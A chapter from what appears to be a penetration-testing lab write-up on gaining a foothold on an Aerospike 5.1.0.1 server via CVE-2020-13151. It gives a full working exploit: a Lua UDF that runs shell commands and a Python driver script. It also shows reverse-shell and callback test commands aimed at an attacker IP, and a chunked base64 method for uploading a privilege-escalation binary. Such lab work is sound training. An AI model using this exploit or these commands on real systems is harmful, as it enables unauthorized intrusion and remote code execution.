# 04 — Foothold: Lua that runs shell

Chapter 03 named the daemon and the CVE. This chapter turns `5.1.0.1` into a shell, and records the
one environmental surprise that shaped everything after it: **the target cannot reach the attacker**,
so files had to travel over the database socket itself.

---

## 4.1 The UDF

Three lines of Lua are the entire payload:

```lua
function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
```

`io.popen` is not a quirk of the sandbox — it is plain Lua, and Aerospike hands it to module code in
`5.1.0.1`. The function signature is the UDF contract: `(record, arg1, ...)`, return value is handed
back to the client as the record's "result".

`client.apply()` returns that value verbatim, so the command's stdout comes back over the same
connection that sent it. No listener, no callback, no port forward.

---

## 4.2 Driving the client

The published exploit refuses this version (chapter 03, §3.3), so the client library is driven
directly:

```python
#!/usr/bin/env python3
"""CVE-2020-13151 — Aerospike CE < 5.1.0.3 unauthenticated command execution."""
import argparse, os, random, string, sys
import aerospike

UDF_SRC = """function runCMD(rec, cmd)
    local handle = io.popen(cmd)
    local out = handle:read("*a")
    handle:close()
    return out
end
"""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ahost", default="192.168.150.143")
    ap.add_argument("--aport", type=int, default=3000)
    ap.add_argument("--namespace", default="test")
    ap.add_argument("--setname", default="cve202013151")
    ap.add_argument("--udf", default="poc.lua")
    ap.add_argument("--cmd", required=True)
    a = ap.parse_args()

    open(a.udf, "w").write(UDF_SRC)

    client = aerospike.client({
        "hosts": [(a.ahost, a.aport)],
        "policies": {"timeout": 8000, "total_timeout": 8000, "socket_timeout": 8000},
    }).connect()

    print("[+] build:", list(client.info_all("build").values())[0][1].strip())

    key = ("".join(random.choice(string.ascii_lowercase) for _ in range(16)))
    client.put((a.namespace, a.setname, key), {"pk": key})   # needs a record to attach to
    client.udf_put(a.udf)                                     # register module 'poc'
    print("[+] executing:", a.cmd)
    print(client.apply((a.namespace, a.setname, key), "poc", "runCMD", [a.cmd]))
    client.close()

if __name__ == "__main__":
    main()
```

Two prerequisites that are easy to miss and produce confusing errors:

- **`udf_put` needs a namespace that exists and a client allowed to write.** `test` is the default
  namespace on a stock install and accepts writes from an unauthenticated client.
- **`apply` needs a real record key.** The UDF is attached to a record, not invoked globally, so the
  `put` has to happen first. Without it, `apply` fails with a not-found rather than anything useful.

---

## 4.3 First command

```bash
python3 poc_aerospike_rce.py --cmd 'id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt'
```

```
[+] build: 5.1.0.1
[+] wrote dummy record test.cve202013151/wblhqohwkzqpgqed
[+] registered UDF module 'poc'
[+] executing: id; hostname; uname -r; echo ---LOCAL---; cat /home/aero/local.txt

===== OUTPUT =====
uid=1000(aero) gid=1000(aero) groups=1000(aero)
lab-pwk2-student-cl4-143-ubuntu20-aero-242-100
5.4.0-104-generic
---LOCAL---
8d0b2414df3c73b491d05711c000a9d6
==================
```

`uid=1000(aero)` — the daemon runs as an unprivileged service account, as it should. The hostname is
worth reading twice: it encodes the lab, the student, the OS and the account
(`…-ubuntu20-aero-242-100`), which is a small information leak in its own right and also a reminder
that this image is built per-student and not hand-hardened.

**`local.txt` is captured in the first command**, because the daemon's own user can read it — no
escalation needed.

That is the good news. The bad news arrives with the next test.

---

## 4.4 The target cannot call back

A reverse shell was the obvious next step. It does not work:

```bash
# attacker
nc -lvnp 4444
```

```bash
# via the UDF
timeout 5 bash -c "cat < /dev/null > /dev/tcp/192.168.45.158/4444" \
  && echo PORT_4444_OK || echo PORT_4444_BLOCKED
```

```
PORT_4444_BLOCKED
```

Same answer for HTTP:

```bash
curl -s -m 4 -o /dev/null -w '%{http_code}\n' http://192.168.45.158:8000/
```

```
000
```

The lab VM has **no route to the attacker's tunnel address**. Outbound to `192.168.45.158` is
dropped; the tunnel is one-way for our purposes. Every reverse shell, every `wget` of a payload,
every `curl | bash` — all dead. (This is a property of the lab's network, not of the box: the same
attacker address is reachable *from* Kali *to* the target, just not back.)

So the constraints for the rest of the engagement are:

1. No inbound listener on the attacker.
2. No outbound fetch on the target.
3. Only the Aerospike socket survives, and it is bidirectional.

Point 3 is the way through. The socket that gave code execution can also carry bytes.

---

## 4.5 A file transport that fits in a UDF call

Binary payloads cannot ride a shell one-liner, and `base64` output through `io.popen` is fine but
each `apply()` blocks a server thread. The compromise is **chunked base64 appended to a temp file**,
with a small chunk size so no single call outlives the client timeout:

```python
CHUNK = 3000
b64 = base64.b64encode(open(local, "rb").read()).decode()

run(f"rm -f {tmp}")
for off in range(0, len(b64), CHUNK):
    run(f"printf '%s' '{b64[off:off+CHUNK]}' >> {tmp}")
run(f"base64 -d {tmp} > {remote} && rm -f {tmp} && chmod {mode} {remote} && sha256sum {remote}")
```

```bash
AHOST=192.168.150.143 python3 poc_aerospike_upload.py \
  --local /tmp/screen_poc/libhax.so --remote /tmp/screenroot/libhax.so --mode 755
```

```
[+] uploading /tmp/screen_poc/libhax.so (14264 bytes) -> /tmp/screenroot/libhax.so
    sent 19020 b64 chars
[+] remote: 190380462e10228d19a9acd956d8c4d789f641cd79ab1d0aa41d6a92b057b775  /tmp/screenroot/libhax.so
```

The hash in the response is the whole point: it is computed **on the target**, so a round-trip match
proves the bytes arrived intact through a channel that was never designed to carry files.

> **The first attempt silently wrote nothing.** The staging directory did not exist, so every
> `printf … >> /tmp/screenroot/libhax.so.b64` failed while the final `base64 -d` reported an empty
> hash. `sha256sum` returning nothing is the tell. Create the directory first, then upload — and
> always compare the remote hash to the local one before using the file.

---

## 4.6 Interactive access

The socket is a fine command channel but a poor terminal. It has no TTY, no job control, and an 8 s
ceiling per call; anything long-running (a `find /`, a watcher) dies mid-call.

Root SSH keys come later (chapter 06), but even as `aero` the cleanest interactive path is the same
idea one level down: write a key, connect on 22. That gives a real shell, arrow keys and `sudo` that
can prompt. It is also the difference between "I have code execution" and "I have a session" — worth
doing before enumeration, because enumeration is interactive work.

With a shell in hand and `local.txt` already banked, the next chapter is the one that decides the
box: what does `aero` have that `aero` should not.
